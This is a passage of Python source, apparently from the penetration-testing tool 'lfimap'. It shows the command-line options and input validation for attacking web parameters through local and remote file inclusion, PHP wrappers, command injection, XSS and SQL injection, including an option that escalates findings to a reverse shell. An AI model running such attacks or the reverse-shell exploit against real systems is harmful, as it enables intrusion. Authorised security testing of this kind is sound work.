    optionsGroup.add_argument('-D', type=str, metavar='<data>', dest='postreq', help='\t\t Do HTTP POST value test. Ex: "param=PWN"')
    optionsGroup.add_argument('-H', type=str, metavar='<header>', action='append', dest='httpheaders', help='\t\t Specify additional HTTP header(s). Ex: "X-Forwarded-For:127.0.0.1"')
    optionsGroup.add_argument('-P', type=str, metavar = '<proxy>', dest='proxyAddr', help='\t\t Specify proxy. Ex: "http://127.0.0.1:8080"')
    optionsGroup.add_argument('--useragent', type=str, metavar= '<agent>', dest='agent', help='\t\t Specify HTTP user agent')
    optionsGroup.add_argument('--referer', type=str, metavar = '<referer>', dest='referer', help='\t\t Specify HTTP referer')
    optionsGroup.add_argument('--param', type=str, metavar='<name>', dest='param', help='\t\t Specify different test parameter value')
    optionsGroup.add_argument('--http-ok', type=int, action='append', metavar='<number>', dest='http_valid', help='\t\t Specify http response code(s) to treat as valid')
    optionsGroup.add_argument('--no-stop', action='store_true', dest = 'no_stop', help='\t\t Don\'t stop using same method upon findings')

    attackGroup = parser.add_argument_group('ATTACK TECHNIQUE')
    attackGroup.add_argument('-f', '--filter', action = 'store_true', dest = 'php_filter', help='\t\t Attack using filter wrapper')
    attackGroup.add_argument('-i', '--input', action = 'store_true', dest = 'php_input', help='\t\t Attack using input wrapper')
    attackGroup.add_argument('-d', '--data', action = 'store_true', dest = 'php_data', help='\t\t Attack using data wrapper')
    attackGroup.add_argument('-e', '--expect', action = 'store_true', dest = 'php_expect', help='\t\t Attack using expect wrapper')
    attackGroup.add_argument('-t', '--trunc', action = 'store_true', dest = 'trunc', help='\t\t Attack using path truncation with wordlist (default "short.txt")')
    attackGroup.add_argument('-r', '--rfi', action = 'store_true', dest = 'rfi', help='\t\t Attack using remote file inclusion')
    attackGroup.add_argument('-c', '--cmd', action = 'store_true', dest = 'cmd', help='\t\t Attack using command injection')
    attackGroup.add_argument('--file', action = 'store_true', dest='file', help='\t\t Attack using file wrapper')
    attackGroup.add_argument('--xss', action = 'store_true', dest = 'xss', help='\t\t Test for reflected XSS')
    attackGroup.add_argument('--sqli', action= 'store_true', dest= 'sqli', help='\t\t Test for SQL injection')
    attackGroup.add_argument('--info', action= 'store_true', dest= 'heuristics', help= '\t\t Test for basic information disclosures')
    attackGroup.add_argument('-a', '--all', action = 'store_true', dest = 'test_all', help='\t\t Use all available methods to attack')
    
    payloadGroup = parser.add_argument_group('PAYLOAD OPTIONS')
    payloadGroup.add_argument('-n', type=str, action='append', metavar='<U|B>', dest='encodings', help='\t\t Specify payload encoding(s). "U" for URL, "B" for base64')
    payloadGroup.add_argument('-x', '--exploit',action='store_true', dest='revshell', help='\t\t Exploit to reverse shell if possible (Setup reverse listener first)')
    payloadGroup.add_argument('--lhost', type=str, metavar='<lhost>', dest='lhost', help='\t\t Specify local ip address for reverse connection')
    payloadGroup.add_argument('--lport', type=int, metavar='<lport>', dest='lport', help='\t\t Specify local port number for reverse connection')
    
    wordlistGroup = parser.add_argument_group('WORDLIST OPTIONS')
    wordlistGroup.add_argument('-wT', type=str, metavar = '<path>', dest='truncWordlist', help='\t\t Specify path to wordlist for truncation test modality')
    wordlistGroup.add_argument('--use-long', action='store_true', dest='uselong', help='\t\t Use "wordlists/long.txt" wordlist for truncation test modality')

    otherGroup = parser.add_argument_group('OTHER')
    otherGroup.add_argument('-v', '--verbose', action='store_true', dest='verbose', help='\t\t Print more detailed output when performing attacks\n')
    otherGroup.add_argument('-h', '--help', action='help', default=argparse.SUPPRESS, help='\t\t Print this help message\n\n')
    args = parser.parse_args()

    url = args.url
    urlfile = args.f
    truncWordlist = args.truncWordlist
    agent = args.agent
    referer = args.referer
   
    # Check if mandatory args are provided
    if(not args.f and not args.url):
        print("[-] Mandatory arguments ('-U' or '-F') unspecified. Refer to help menu with '-h' or '--help'.")
        sys.exit(-1)

    # if '-F' is provided, set mode to file
    if(args.f): mode="file"
    # if '-D' is provided, set mode to post
    elif(args.postreq): mode = "post"
    # otherwise, set mode to get
    else: mode = "get"
    
    if(not args.param):
        args.param = "PWN"
    
    #Warning if cookie is not provided
    if(not args.cookie):
        print("[!] Cookie argument ('-C') is not provided. lfimap might have troubles finding vulnerabilities if web app requires a cookie.\n")
    
    if(args.php_filter or args.php_input or args.php_data or args.php_expect or args.trunc or args.rfi or args.cmd or args.file or args.xss or args.test_all or not args.heuristics):
        if(mode=="file"):
            # Check if file exists
            if(not os.path.exists(args.f)):
                print("[-] File '" + args.f + "' doesn't exist. Exiting...")
                sys.exit(-1)

        # Checks if any parameter is selected for testing
        elif(mode == "get"):
            if(args.param not in url):
                print("[-] '" + args.param + "' is not found in the URL. Please specify it as a parameter value for testing. Exiting...\n")
                sys.exit(-1)
        else:
            if(args.param not in args.postreq):
                print("[-] '" + args.param + "' is not found in POST data. Please specify it inside '-D' parameter. Exiting...\n")
                sys.exit(-1)
        
            if(args.param in args.url):
                print("[-] Cannot do POST and GET mode testing at once. Exiting...\n")
                sys.exit(-1)
        
    #If testing using GET this checks if provided URL is valid
    urlRegex = re.compile(
    r'^(?:http|ftp)s?://' # http:// or https:// or ftp://
    r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|' #domain...
    r'localhost|' #localhost...
    r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})' # ...or ip
    r'(?::\d+)?' # optional port
    r'(?:/?|[/?]\S+)$', re.IGNORECASE)
    
    if(mode != "file"):
        if("http" not in url and "socks" not in url):
            if(args.verbose): print("[i] No URL scheme provided. Defaulting to http.")

            args.url = "http://" + url
            url = "http://" + url
            
        if(re.match(urlRegex, url) is None):
            print("[-] URL not valid, exiting...")
            sys.exit(-1)

    if(scriptDirectory == ""):
        separator = ""
    else: separator = os.sep
    
    #Check if provided trunc wordlist exists
    if(truncWordlist is not None):
        if(not os.path.isfile(truncWordlist)):
            print("[-] Specified truncation wordlist '" + truncWordlist + "' doesn't exist. Exiting...")
            sys.exit(-1)
    else:
        if(args.uselong): truncWordlist = scriptDirectory + separator + "wordlists" + separator + "long.txt" 
        else: truncWordlist = scriptDirectory + separator + "wordlists" + separator + "short.txt"
        if((not os.path.exists(truncWordlist)) and (args.test_all or args.trunc)):
            print("[-] Cannot locate " + truncWordlist + " wordlist. Since '-a' or '-t' was specified, lfimap will exit...")
            sys.exit(-1)

    #Checks if '--lhost' and '--lport' are provided with '-x'
    if(args.revshell):
        if(not args.lhost):
            print("[-] Please, specify localhost IP ('--lhost') for reverse shell. Exiting...")
            sys.exit(-1)

        if(not args.lport):
            print("[-] Please, specify localhost PORT number ('--lport') for reverse shell. Exiting...")
            sys.exit(-1)

        else:
            reg = r"^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"
            if(not re.match(reg, args.lhost)):
                print("[-] LHOST IP address is not valid. Exiting...")
                sys.exit(-1)

            if(args.lport < 1 or args.lport > 65534):
                print("[-] LPORT must be between 1 and 65534. Exiting ...")
                sys.exit(-1)

    #Check if proxy is correct
    if(args.proxyAddr):
        try:
            if("http" not in args.proxyAddr and "socks" not in args.proxyAddr):
                if(args.verbose): print("[i] No proxy scheme provided. Defaulting to http.")
                args.proxyAddr = "http://" + args.proxyAddr

            r = requests.get(args.proxyAddr, timeout = 5, verify = False)
            if(r.status_code >= 500):
                print("[-] Proxy is available, but it returns server-side error code >=500. Exiting...")
                sys.exit(-1)
        except:
            print("[-] Proxy is not available. Exiting...")
            sys.exit(-1)
    
    #Setup a temporary argument placeholder.
    exists = False
    TEMP = ["CMD", "TEMP", "LFIMAP", "LFI"]
    
    if(mode != "file"):
        for item in TEMP:
            if(item not in args.url):
                tempArg = item
                break
    else: 
        with open(args.f, "r") as fi:
            lines = fi.read().splitlines()
            for item in TEMP:
                for line in lines:
                    if(item in line):
                        exists = True
                if(not exists):
                    tempArg = item
                    break

    if(args.encodings):
        for e in args.encodings:
            if(e != "U" and e != "B"):
                print("[!] Invalid payload encoding specified. Please use 'U' for url or 'B' for base64 encoded payload.")
                sys.exit(-1)

    if(mode == "file" and args.revshell):
        print("[!] Specifing multiple url testing with '-F' and reverse shell attack with '-x' is NOT RECOMMENDED, unless you know what you're doing.")
        option = input("[?] Are you sure you want to continue? y/n: ")
        if(option != "y" and option != "Y"):
            print("[i] User selected exit option. Exiting...")
            sys.exit(-1)
        
    #Preparing headers
    headers = prepareHeaders()
    if(args.cookie is not None):
        addHeader("Cookie", args.cookie)
    if(args.postreq):
        addHeader("Content-Type", "application/x-www-form-urlencoded")
    if(args.httpheaders):
        for i in range(len(args.httpheaders)):
            if(":" not in args.httpheaders[i]):
                print("[-] '"+args.httpheaders[i]+"'" + " has no ':' to distinguish parameter name from value. Exiting...")
                sys.exit(-1)     
            elif(args.httpheaders[i][0] == ":"):
                print("[-] Header name cannot start with ':' character. Exiting...")
                sys.exit(-1)
            else:
                addHeader(args.httpheaders[i].split(":",1)[0].lstrip(), args.httpheaders[i].split(":",1)[1].lstrip())
    main()
